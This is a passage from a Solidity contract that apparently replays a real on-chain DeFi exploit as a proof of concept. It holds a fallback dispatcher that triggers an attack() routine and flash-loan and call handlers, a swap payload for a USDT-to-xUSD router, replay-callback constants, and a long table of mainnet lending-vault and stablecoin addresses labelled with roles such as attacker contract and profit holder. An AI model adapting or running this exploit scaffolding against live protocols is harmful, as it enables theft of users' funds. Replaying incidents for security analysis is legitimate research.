        uint256 dispatchArg0FlashLoan4;
        assembly { dispatchArg0FlashLoan4 := calldataload(4) }
        if (address(uint160(dispatchArg0FlashLoan4)) == 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) {
            _flashLoan4();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _flashLoan3();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x6624ef70) {
            attack();
            return;
        }
        if (msg.sig == 0x414f3e80) {
            uint256 dispatchArg0Call5;
            assembly { dispatchArg0Call5 := calldataload(4) }
            if (dispatchArg0Call5 == 0x000000000000000000000000eba9b3d4336802ccfbdb80afbda820e9eef97f8e) {
                _call5();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            uint256 dispatchArg0Call2;
            assembly { dispatchArg0Call2 := calldataload(4) }
            if (dispatchArg0Call2 == 0x00000000000000000000000081f025c87367033d87b6d3a95289b36106770b25) {
                _call2();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            uint256 dispatchArg0Call6;
            assembly { dispatchArg0Call6 := calldataload(4) }
            if (dispatchArg0Call6 == 0x000000000000000000000000857a0cac1ac29d8101822f8879e4e6918293c7b5) {
                _call6();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            uint256 dispatchArg0Call3;
            assembly { dispatchArg0Call3 := calldataload(4) }
            if (dispatchArg0Call3 == 0x000000000000000000000000d0aadde147b6d683cbb80bfe0fb9e8db9de1958f) {
                _call3();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            uint256 dispatchArg0Call4;
            assembly { dispatchArg0Call4 := calldataload(4) }
            if (dispatchArg0Call4 == 0x000000000000000000000000d00c168451fddd8ef839e5c0f5b9666143d9400b) {
                _call4();
                bytes memory ret = hex"";
                assembly { return(add(ret, 32), mload(ret)) }
            }
            _call5();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
    }

    function executeArg10Payload() internal pure returns (bytes memory) {
        bytes memory routerActions = hex"070c0f";
        bytes[] memory routerInputs = new bytes[](3);
        routerInputs[0] = abi.encode(
            uint256(32),
            Addresses.USDT,
            uint256(128),
            uint256(20000000000),
            uint256(0),
            uint256(1),
            uint256(32),
            Addresses.xUSD,
            uint256(489960),
            uint256(9799),
            uint256(0),
            uint256(160),
            uint256(0)
        );
        routerInputs[1] = abi.encode(Addresses.USDT, uint256(20000000000));
        routerInputs[2] = abi.encode(Addresses.xUSD, uint256(0));
        return abi.encode(routerActions, routerInputs);
    }
    bytes32 private constant REPLAY_CALLBACK_14 = keccak256("poc.replay.REPLAY_CALLBACK_14");
    bytes32 private constant REPLAY_CALLBACK_18 = keccak256("poc.replay.REPLAY_CALLBACK_18");
    bytes32 private constant REPLAY_CALLBACK_22 = keccak256("poc.replay.REPLAY_CALLBACK_22");
    bytes32 private constant REPLAY_CALLBACK_26 = keccak256("poc.replay.REPLAY_CALLBACK_26");
    bytes32 private constant REPLAY_CALLBACK_28 = keccak256("poc.replay.REPLAY_CALLBACK_28");
    bytes32 private constant REPLAY_CALLBACK_29 = keccak256("poc.replay.REPLAY_CALLBACK_29");
    bytes32 private constant REPLAY_CALLBACK_31 = keccak256("poc.replay.REPLAY_CALLBACK_31");
    bytes32 private constant REPLAY_CALLBACK_32 = keccak256("poc.replay.REPLAY_CALLBACK_32");
    bytes32 private constant REPLAY_CALLBACK_34 = keccak256("poc.replay.REPLAY_CALLBACK_34");
    bytes32 private constant REPLAY_CALLBACK_36 = keccak256("poc.replay.REPLAY_CALLBACK_36");
    bytes32 private constant REPLAY_CALLBACK_37 = keccak256("poc.replay.REPLAY_CALLBACK_37");
    bytes32 private constant REPLAY_CALLBACK_38 = keccak256("poc.replay.REPLAY_CALLBACK_38");
    bytes32 private constant REPLAY_CALLBACK_39 = keccak256("poc.replay.REPLAY_CALLBACK_39");
    bytes32 private constant REPLAY_CALLBACK_40 = keccak256("poc.replay.REPLAY_CALLBACK_40");
    bytes32 private constant REPLAY_CALLBACK_41 = keccak256("poc.replay.REPLAY_CALLBACK_41");
    bytes32 private constant REPLAY_CALLBACK_42 = keccak256("poc.replay.REPLAY_CALLBACK_42");
    bytes32 private constant REPLAY_CALLBACK_43 = keccak256("poc.replay.REPLAY_CALLBACK_43");
    bytes32 private constant REPLAY_CALLBACK_44 = keccak256("poc.replay.REPLAY_CALLBACK_44");
    bytes32 private constant REPLAY_CALLBACK_45 = keccak256("poc.replay.REPLAY_CALLBACK_45");
    bytes32 private constant REPLAY_CALLBACK_46 = keccak256("poc.replay.REPLAY_CALLBACK_46");
    bytes32 private constant REPLAY_CALLBACK_47 = keccak256("poc.replay.REPLAY_CALLBACK_47");
    bytes32 private constant REPLAY_CALLBACK_48 = keccak256("poc.replay.REPLAY_CALLBACK_48");
    bytes32 private constant REPLAY_CALLBACK_49 = keccak256("poc.replay.REPLAY_CALLBACK_49");
    bytes32 private constant REPLAY_CALLBACK_50 = keccak256("poc.replay.REPLAY_CALLBACK_50");
    bytes32 private constant REPLAY_CALLBACK_52 = keccak256("poc.replay.REPLAY_CALLBACK_52");
    bytes32 private constant REPLAY_CALLBACK_53 = keccak256("poc.replay.REPLAY_CALLBACK_53");
    bytes32 private constant REPLAY_CALLBACK_54 = keccak256("poc.replay.REPLAY_CALLBACK_54");
    bytes32 private constant REPLAY_CALLBACK_55 = keccak256("poc.replay.REPLAY_CALLBACK_55");
    bytes32 private constant REPLAY_CALLBACK_57 = keccak256("poc.replay.REPLAY_CALLBACK_57");
    bytes32 private constant REPLAY_CALLBACK_58 = keccak256("poc.replay.REPLAY_CALLBACK_58");
    bytes32 private constant REPLAY_CALLBACK_59 = keccak256("poc.replay.REPLAY_CALLBACK_59");
    bytes32 private constant REPLAY_CALLBACK_60 = keccak256("poc.replay.REPLAY_CALLBACK_60");
    bytes32 private constant REPLAY_CALLBACK_62 = keccak256("poc.replay.REPLAY_CALLBACK_62");
    bytes32 private constant REPLAY_CALLBACK_63 = keccak256("poc.replay.REPLAY_CALLBACK_63");
    bytes32 private constant REPLAY_CALLBACK_65 = keccak256("poc.replay.REPLAY_CALLBACK_65");
    bytes32 private constant REPLAY_CALLBACK_66 = keccak256("poc.replay.REPLAY_CALLBACK_66");
    bytes32 private constant REPLAY_CALLBACK_67 = keccak256("poc.replay.REPLAY_CALLBACK_67");
    bytes32 private constant REPLAY_CALLBACK_68 = keccak256("poc.replay.REPLAY_CALLBACK_68");
    bytes32 private constant REPLAY_CALLBACK_69 = keccak256("poc.replay.REPLAY_CALLBACK_69");
    bytes32 private constant REPLAY_CALLBACK_70 = keccak256("poc.replay.REPLAY_CALLBACK_70");
    bytes32 private constant REPLAY_CALLBACK_71 = keccak256("poc.replay.REPLAY_CALLBACK_71");
    bytes32 private constant REPLAY_CALLBACK_73 = keccak256("poc.replay.REPLAY_CALLBACK_73");
    bytes32 private constant REPLAY_CALLBACK_74 = keccak256("poc.replay.REPLAY_CALLBACK_74");
    bytes32 private constant REPLAY_CALLBACK_76 = keccak256("poc.replay.REPLAY_CALLBACK_76");
    bytes32 private constant REPLAY_CALLBACK_77 = keccak256("poc.replay.REPLAY_CALLBACK_77");
    bytes32 private constant REPLAY_CALLBACK_79 = keccak256("poc.replay.REPLAY_CALLBACK_79");
    bytes32 private constant REPLAY_CALLBACK_80 = keccak256("poc.replay.REPLAY_CALLBACK_80");
    bytes32 private constant REPLAY_CALLBACK_81 = keccak256("poc.replay.REPLAY_CALLBACK_81");
    bytes32 private constant REPLAY_CALLBACK_83 = keccak256("poc.replay.REPLAY_CALLBACK_83");
    bytes32 private constant REPLAY_CALLBACK_84 = keccak256("poc.replay.REPLAY_CALLBACK_84");
    bytes32 private constant REPLAY_CALLBACK_85 = keccak256("poc.replay.REPLAY_CALLBACK_85");
    bytes32 private constant REPLAY_CALLBACK_86 = keccak256("poc.replay.REPLAY_CALLBACK_86");
    bytes32 private constant REPLAY_CALLBACK_87 = keccak256("poc.replay.REPLAY_CALLBACK_87");
    bytes32 private constant REPLAY_CALLBACK_88 = keccak256("poc.replay.REPLAY_CALLBACK_88");
    bytes32 private constant REPLAY_CALLBACK_89 = keccak256("poc.replay.REPLAY_CALLBACK_89");
    bytes32 private constant REPLAY_CALLBACK_90 = keccak256("poc.replay.REPLAY_CALLBACK_90");
    bytes32 private constant REPLAY_CALLBACK_91 = keccak256("poc.replay.REPLAY_CALLBACK_91");
    bytes32 private constant REPLAY_CALLBACK_92 = keccak256("poc.replay.REPLAY_CALLBACK_92");
    bytes32 private constant REPLAY_CALLBACK_93 = keccak256("poc.replay.REPLAY_CALLBACK_93");
    bytes32 private constant REPLAY_CALLBACK_103 = keccak256("poc.replay.REPLAY_CALLBACK_103");
    bytes32 private constant REPLAY_CALLBACK_104 = keccak256("poc.replay.REPLAY_CALLBACK_104");
    bytes32 private constant REPLAY_CALLBACK_105 = keccak256("poc.replay.REPLAY_CALLBACK_105");
    mapping(bytes32 => bool) private _replayDone;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004; // Addresses.A_000000_0004 = 0x0000000000000000000000000000000000000004 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90; // Addresses.PoolManager = 0x000000000004444c5dc75cb358380d2e3de08a90 label=PoolManager roles=asset|contract|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant Permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3; // Addresses.Permit2 = 0x000000000022d473030f116ddee9f6b43ac78ba3 label=Permit2 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant hyperUSDCc = 0x0229dB3921dE71CFa43Cfe9fb6A87b403647A9ae; // Addresses.hyperUSDCc = 0x0229db3921de71cfa43cfe9fb6a87b403647a9ae label=VaultV2 token_symbol=hyperUSDCc roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant dUSDC_124 = 0x0290F0D0375c7448b6F05703aa3C3729E989A3E3; // Addresses.dUSDC_124 = 0x0290f0d0375c7448b6f05703aa3c3729e989a3e3 label=ShareDebtToken token_symbol=dUSDC-124 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_path_entry = 0x0514F827C129C16418a0933E03C99A6AF982FC61; // Addresses.attack_path_entry = 0x0514f827c129c16418a0933e03c99a6af982fc61 label=attack_path_entry roles=asset|attack_path_entry_contract|attacker_contract|attacker_surface_contract|code_contract|contract|economic_holder|localized_contract|observed_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant edgeUSDC = 0x0562AE950276B24F3eAE0d0a518dADB7Ad2F8D66; // Addresses.edgeUSDC = 0x0562ae950276b24f3eae0d0a518dadb7ad2f8d66 label=MetaMorphoV1_1 token_symbol=edgeUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant StakingRewards = 0x0650CAF159C5A49f711e8169D4336ECB9b950275; // Addresses.StakingRewards = 0x0650caf159c5a49f711e8169d4336ecb9b950275 label=StakingRewards roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark = 0x068df9A153948B4be0d4dcC074c3a44ba787b26c; // Addresses.ERC4626Ark = 0x068df9a153948b4be0d4dcc074c3a44ba787b26c label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant fxUSD = 0x085780639CC2cACd35E474e71f4d000e2405d8f6; // Addresses.fxUSD = 0x085780639cc2cacd35e474e71f4d000e2405d8f6 label=TransparentUpgradeableProxy token_symbol=fxUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_BF13 = 0x0b133268a8cfe434B3A6D55a5112c9aE25f3bF13; // Addresses.ERC4626Ark_BF13 = 0x0b133268a8cfe434b3a6d55a5112c9ae25f3bf13 label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_8141 = 0x0C939b702524fDaBa4914E905Bcb850182308141; // Addresses.ERC4626Ark_8141 = 0x0c939b702524fdaba4914e905bcb850182308141 label=ERC4626Ark roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant reUSDC = 0x0F359FD18BDa75e9c49bC027E7da59a4b01BF32a; // Addresses.reUSDC = 0x0f359fd18bda75e9c49bc027e7da59a4b01bf32a label=MetaMorpho token_symbol=reUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_29C8 = 0x0FA036c6476e16d68a664c0E2DA2BE7e85Ac29c8; // Addresses.ERC4626Ark_29C8 = 0x0fa036c6476e16d68a664c0e2da2be7e85ac29c8 label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant BufferArk = 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B; // Addresses.BufferArk = 0x106cbb1f445f0bffa7894f4199ee940bf7f6dd2b label=BufferArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant SiloConfig = 0x10930071079d2cfff317ABa9d2dd997309Dd9985; // Addresses.SiloConfig = 0x10930071079d2cfff317aba9d2dd997309dd9985 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_0CB8 = 0x1534e3D0f23D91142424A0091aab8037fac80CB8; // Addresses.ERC4626Ark_0CB8 = 0x1534e3d0f23d91142424a0091aab8037fac80cb8 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_D79B = 0x165D1accC5C6326e7EE4deeF75Ac3ffC8ce4D79B; // Addresses.ERC4626Ark_D79B = 0x165d1accc5c6326e7ee4deef75ac3ffc8ce4d79b label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2 = 0x167D283aCAC1b9ff39466A75aA82902f340f1F4D; // Addresses.MorphoChainlinkOracleV2 = 0x167d283acac1b9ff39466a75aa82902f340f1f4d label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant bbUSDC = 0x186514400e52270cef3D80e1c6F8d10A75d47344; // Addresses.bbUSDC = 0x186514400e52270cef3d80e1c6f8d10a75d47344 label=MetaMorpho token_symbol=bbUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant bUSDC_154 = 0x19089004eE41aC63Bc81D0854BC6Cb561A44096B; // Addresses.bUSDC_154 = 0x19089004ee41ac63bc81d0854bc6cb561a44096b label=Silo token_symbol=bUSDC-154 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDS = 0x1923DfeE706A8E78157416C29cBCCFDe7cdF4102; // Addresses.USDS = 0x1923dfee706a8e78157416c29cbccfde7cdf4102 label=Usds token_symbol=USDS roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_199C08_F826 = 0x199C084402D8C25BED56650DCb842ab9ed05f826; // Addresses.A_199C08_F826 = 0x199c084402d8c25bed56650dcb842ab9ed05f826 label=unresolved roles=recipient source=unresolved confidence=low
    address internal constant MorphoVaultArk = 0x1Ae10e9425653177282E6054a5c828391a533aC7; // Addresses.MorphoVaultArk = 0x1ae10e9425653177282e6054a5c828391a533ac7 label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_CF69 = 0x1B31793E0f8afD346CEAA60A3D1859F3A9d9cF69; // Addresses.ERC4626Ark_CF69 = 0x1b31793e0f8afd346ceaa60a3d1859f3a9d9cf69 label=ERC4626Ark roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SyrupArk = 0x1bf7ef7eD5AC8285DFE6e538b92364Ad095dd1A3; // Addresses.SyrupArk = 0x1bf7ef7ed5ac8285dfe6e538b92364ad095dd1a3 label=SyrupArk roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant OriginUSDArk = 0x1C354B455bEf33744397A561dC518A2a9F4f5bab; // Addresses.OriginUSDArk = 0x1c354b455bef33744397a561dc518a2a9f4f5bab label=OriginUSDArk roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoMarketV1AdapterV2 = 0x1d511811ACA9d8817a3e50F29CadFf6243A02902; // Addresses.MorphoMarketV1AdapterV2 = 0x1d511811aca9d8817a3e50f29cadff6243a02902 label=MorphoMarketV1AdapterV2 roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant bUSDC_155 = 0x1dE3bA67Da79A81Bc0c3922689c98550e4bd9bc2; // Addresses.bUSDC_155 = 0x1de3ba67da79a81bc0c3922689c98550e4bd9bc2 label=Silo token_symbol=bUSDC-155 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_9SUSDC11Core = 0x1E2aAaDcF528b9cC08F43d4fd7db488cE89F5741; // Addresses.A_9SUSDC11Core = 0x1e2aaadcf528b9cc08f43d4fd7db488ce89f5741 label=MetaMorphoV1_1 token_symbol=9SUSDC11Core roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626RateProvider = 0x1Ef72036F53a0d552ada49626FE90BDaC6207DC5; // Addresses.ERC4626RateProvider = 0x1ef72036f53a0d552ada49626fe90bdac6207dc5 label=ERC4626RateProvider roles=sender source=etherscan_v2 confidence=high
    address internal constant dRLP_127 = 0x1F90070C3170EA439D042ACaC3F593f10D6b3519; // Addresses.dRLP_127 = 0x1f90070c3170ea439d042acac3f593f10d6b3519 label=ShareDebtToken token_symbol=dRLP-127 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_F793 = 0x205ae98cD205b64eC0840D93D80e32114a75F793; // Addresses.ERC4626Ark_F793 = 0x205ae98cd205b64ec0840d93d80e32114a75f793 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // Addresses.WBTC = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599 label=WBTC roles=observed_address source=etherscan_v2 confidence=high
    address internal constant dxUSD_155 = 0x294Fada544463A98F927B5f161cB257e1D129bB8; // Addresses.dxUSD_155 = 0x294fada544463a98f927b5f161cb257e1d129bb8 label=ShareDebtToken token_symbol=dxUSD-155 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant RateTargetKinkInterestRateStrategy = 0x2961d766D71F33F6C5e6Ca8bA7d0Ca08E6452C92; // Addresses.RateTargetKinkInterestRateStrategy = 0x2961d766d71f33f6c5e6ca8ba7d0ca08e6452c92 label=RateTargetKinkInterestRateStrategy roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant OUSD = 0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86; // Addresses.OUSD = 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86 label=InitializeGovernedUpgradeabilityProxy token_symbol=OUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_7524 = 0x2B8078ED8b642dc3BF8691C4d1493822f4917524; // Addresses.MorphoVaultArk_7524 = 0x2b8078ed8b642dc3bf8691c4d1493822f4917524 label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant IV_vgUSDC = 0x2C10339DB12D2e5f78060913FeAa637187D6310C; // Addresses.IV_vgUSDC = 0x2c10339db12d2e5f78060913feaa637187d6310c label=IdleVault token_symbol=IV-vgUSDC roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant AaveV4Farm = 0x2CdF51ca20C2DD56480c35adEA667A6653Fb7657; // Addresses.AaveV4Farm = 0x2cdf51ca20c2dd56480c35adea667a6653fb7657 label=AaveV4Farm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant TipJar = 0x2d1A2637c3E0c80f31A91d0b6dbC5a107988a401; // Addresses.TipJar = 0x2d1a2637c3e0c80f31a91d0b6dbc5a107988a401 label=TipJar roles=observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_8721 = 0x2E890e54495361aa78ada62084478B7C65F88721; // Addresses.ERC4626Ark_8721 = 0x2e890e54495361aa78ada62084478b7c65f88721 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dwsrUSD_150 = 0x323279ac5f3A2b5159273Ea81b8425FD45A6B4A3; // Addresses.dwsrUSD_150 = 0x323279ac5f3a2b5159273ea81b8425fd45a6b4a3 label=ShareDebtToken token_symbol=dwsrUSD-150 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV3Pool = 0x3416cF6C708Da44DB2624D63ea0AAef7113527C6; // Addresses.UniswapV3Pool = 0x3416cf6c708da44db2624d63ea0aaef7113527c6 label=UniswapV3Pool roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant eUSDC_45 = 0x3573A84Bee11D49A1CbCe2b291538dE7a7dD81c6; // Addresses.eUSDC_45 = 0x3573a84bee11d49a1cbce2b291538de7a7dd81c6 label=BeaconProxy token_symbol=eUSDC-45 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant Vat = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B; // Addresses.Vat = 0x35d1b3f3d7966a1dfe207aa4514c12a259a0492b label=Vat roles=asset|contract source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_F815 = 0x36Cb058364a811636685ef15a71E8ea99043f815; // Addresses.MorphoChainlinkOracleV2_F815 = 0x36cb058364a811636685ef15a71e8ea99043f815 label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_3A6F = 0x36D0501D07619274a398AFf16007337041873A6F; // Addresses.ERC4626Ark_3A6F = 0x36d0501d07619274a398aff16007337041873a6f label=ERC4626Ark roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SiloConfig_5D76 = 0x36FD48188E09Cc5c1Db9fdf4bc7e27C266cD5d76; // Addresses.SiloConfig_5D76 = 0x36fd48188e09cc5c1db9fdf4bc7e27c266cd5d76 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_37305B_7341 = 0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341; // Addresses.A_37305B_7341 = 0x37305b1cd40574e4c5ce33f8e8306be057fd7341 label=0x37305b1cd40574e4c5ce33f8e8306be057fd7341 roles=economic_holder|observed_address|recipient|sender source=asset_delta.profit_candidates confidence=medium
    address internal constant spUSDC = 0x377C3bd93f2a2984E1E7bE6A5C22c525eD4A4815; // Addresses.spUSDC = 0x377c3bd93f2a2984e1e7be6a5c22c525ed4a4815 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=spUSDC roles=asset|contract|economic_asset|economic_holder|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant dUSDC_150 = 0x389F8D8C03647c03fcBe993F4E58ea65CD049922; // Addresses.dUSDC_150 = 0x389f8d8c03647c03fcbe993f4e58ea65cd049922 label=ShareDebtToken token_symbol=dUSDC-150 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant apyUSD = 0x38EEb52F0771140d10c4E9A9a72349A329Fe8a6A; // Addresses.apyUSD = 0x38eeb52f0771140d10c4e9a9a72349a329fe8a6a label=ERC1967Proxy token_symbol=apyUSD roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UsdsJoin = 0x3C0f895007CA717Aa01c8693e59DF1e8C3777FEB; // Addresses.UsdsJoin = 0x3c0f895007ca717aa01c8693e59df1e8c3777feb label=UsdsJoin roles=asset|contract|observed_address source=etherscan_v2 confidence=high
    address internal constant eUSDC_57 = 0x3C75C170671acb394804DfAf63e4F9891C121625; // Addresses.eUSDC_57 = 0x3c75c170671acb394804dfaf63e4f9891c121625 label=BeaconProxy token_symbol=eUSDC-57 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant srUSDe = 0x3d7d6fdf07EE548B939A80edbc9B2256d0cdc003; // Addresses.srUSDe = 0x3d7d6fdf07ee548b939a80edbc9b2256d0cdc003 label=TransparentUpgradeableProxy token_symbol=srUSDe roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SkyRewardsArk = 0x3d8C278F05F655F26dcbf828C084E5182FD8d409; // Addresses.SkyRewardsArk = 0x3d8c278f05f655f26dcbf828c084e5182fd8d409 label=SkyRewardsArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_59E8 = 0x3f289b064CD07E42210a57819908a937BEC859e8; // Addresses.ERC4626Ark_59E8 = 0x3f289b064cd07e42210a57819908a937bec859e8 label=ERC4626Ark roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant SyrupArk_76E5 = 0x3F9e195a8ee39Ed7B4a14A919F4a165c872976e5; // Addresses.SyrupArk_76E5 = 0x3f9e195a8ee39ed7b4a14a919f4a165c872976e5 label=SyrupArk roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_8AEB = 0x40087B15127791FF55746c4E87e4e4AFb88a8AEb; // Addresses.MorphoVaultArk_8AEB = 0x40087b15127791ff55746c4e87e4e4afb88a8aeb label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant GHO = 0x40D16FC0246aD3160Ccc09B8D0D3A2cD28aE6C2f; // Addresses.GHO = 0x40d16fc0246ad3160ccc09b8d0d3a2cd28ae6c2f label=GhoToken token_symbol=GHO roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant StakedCap = 0x42c0e0ef7C2F35de073F4d6f9c0e4483429c3D31; // Addresses.StakedCap = 0x42c0e0ef7c2f35de073f4d6f9c0e4483429c3d31 label=StakedCap roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd; // Addresses.FiatTokenV2_2 = 0x43506849d7c04f9138d1a2050bbf3a0c054402dd label=FiatTokenV2_2 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_CB59 = 0x43AA3980D07C3343a815202Cf400D5027b0Bcb59; // Addresses.MorphoVaultArk_CB59 = 0x43aa3980d07c3343a815202cf400d5027b0bcb59 label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant CurveRouter_v1_2 = 0x45312ea0eFf7E09C83CBE249fa1d7598c4C8cd4e; // Addresses.CurveRouter_v1_2 = 0x45312ea0eff7e09c83cbe249fa1d7598c4c8cd4e label=CurveRouter v1.2 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_2D47 = 0x46955BC1EeCd65bf6C5c764EB158E2618Db72D47; // Addresses.ERC4626Ark_2D47 = 0x46955bc1eecd65bf6c5c764eb158e2618db72d47 label=ERC4626Ark roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_8A67 = 0x47F73542a9b59C2316832775C51cC99E6B468A67; // Addresses.ERC4626Ark_8A67 = 0x47f73542a9b59c2316832775c51cc99e6b468a67 label=ERC4626Ark roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant eUSDC_47 = 0x481D4909D7ca2eb27c4975f08dCE07DBeF0d3Fa7; // Addresses.eUSDC_47 = 0x481d4909d7ca2eb27c4975f08dce07dbef0d3fa7 label=BeaconProxy token_symbol=eUSDC-47 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
